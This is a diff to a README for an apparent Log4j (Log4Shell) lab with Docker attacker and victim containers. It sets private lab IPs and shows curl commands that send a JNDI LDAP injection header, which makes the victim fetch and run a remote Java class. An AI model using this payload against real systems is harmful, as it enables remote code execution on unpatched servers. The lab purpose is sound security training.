@@ -63,10 +63,10 @@ M75-LOG4J-VULNERABILITY
     ```
     #.env
 
-    VICTIM_TO_ATTACKER_HTTP_PORT=8081
-    VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME=20.231.205.2
-    ATTACKER_HTTP_SERVER_PORT=8081
-    ATTACKER_HTTP_DIR=./http-dir
+    export VICTIM_TO_ATTACKER_HTTP_PORT=8081
+    export VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME=10.5.0.4
+    export ATTACKER_HTTP_SERVER_PORT=8081
+    export ATTACKER_HTTP_DIR=./http-dir
     ```
 
 2. Build and run the docker containers.
@@ -75,19 +75,20 @@ M75-LOG4J-VULNERABILITY
 
     ```
     cd M75-log4j-vuln/attacker
-    docker compose up
+    docker compose up -d
     ```
 
 3. Launch the exploit.
 
     ```
-    VICTIM=<The victim accessible IP or domain name accessible by the attacker>
-    VICTIM_VULN_PORT=<The port where the log4j vulnerable web app is running on the victim>
-    ATTACKER=<The attacker IP or Domain name accessible by the victim, for callbacks>
+    VICTIM=10.5.0.5
+    VICTIM_VULN_PORT=8080
+    ATTACKER=10.5.0.4
     LDAP_PORT=1389
     STAGE2_JAVA_CLASS_NAME=Plugin
     curl ${VICTIM}:${VICTIM_VULN_PORT} -H 'X-Api-Version: ${jndi:ldap://${ATTACKER}:${LDAP_PORT}/${STAGE2_JAVA_CLASS_NAME}}'
     ```
+curl 10.5.0.5:8080 -H 'X-Api-Version: ${jndi:ldap://10.5.0.4:1389/Plugin}'
 
 # Development
 
